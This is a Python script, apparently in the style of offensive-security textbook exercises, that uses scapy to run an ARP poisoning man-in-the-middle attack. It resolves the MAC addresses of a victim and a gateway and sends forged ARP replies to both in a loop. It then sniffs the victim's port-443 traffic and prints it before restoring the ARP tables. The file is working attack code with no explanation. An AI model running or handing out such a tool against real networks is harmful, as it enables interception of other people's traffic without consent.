from multiprocessing import Process
import sys
import time
from scapy.config import conf
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp, send, sniff
from scapy.utils import wrpcap


def packet_callback(packet):
    print(packet.show())


def get_mac(target_ip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op="who-has", pdst=target_ip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None


class Arper:
    def __init__(self, victim, gateway, interface='en0'):
        self.snif_thread = None
        self.poison_thread = None
        self.victim = victim
        self.victim_mac = get_mac(victim)
        self.gateway = gateway
        self.gateway_mac = get_mac(gateway)
        self.interface = interface
        conf.interface = interface
        conf.verb = 0

        print(f'initialised interface: {interface}')
        print(f'gateway: {gateway} at {self.gateway_mac}')
        print(f'victim: {victim} at {self.victim_mac}')
        print('-' * 30)

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()
        self.snif_thread = Process(target=self.sniff)
        self.snif_thread.start()

    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victim_mac

        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'hw src: {poison_victim.hwsrc}')
        print(f'hw dst: {poison_victim.hwdst}')

        print(poison_victim.summary())
        print('-' * 30)

        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gateway_mac

        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'hw src: {poison_gateway.hwsrc}')
        print(f'hw dst: {poison_gateway.hwdst}')

        print(poison_gateway.summary())
        print('-' * 30)

        print(f'Beginning the ARP poison [Ctrl-C to stop]')
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(0.1)

    def sniff(self, count=15):
        time.sleep(5)
        print(f'sniffing {count} packages')
        bpf_filter = 'dst port 443'
        print(f'sniffing filter: {bpf_filter}')
        packets = sniff(filter=bpf_filter, prn=packet_callback, store=0, count=400)
        print('Got The Packets')
        self.restore()
        self.poison_thread.terminate()
        print('Finished')

    def restore(self):
        print('Restoring ARP table')
        send(
            ARP(
                op=2,
                psrc=self.gateway,
                pdst=self.victim,
                hwsrc=self.gateway_mac,
                hwdst='ff:ff:ff:ff:ff:ff'),
            count=5
        )
        send(
            ARP(
                op=2,
                psrc=self.victim,
                pdst=self.gateway,
                hwsrc=self.victim_mac,
                hwdst='ff:ff:ff:ff:ff:ff'
            ),
            count=5
        )


def main():
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    my_arp = Arper(victim, gateway, interface)
    my_arp.run()


if __name__ == "__main__":
    main()
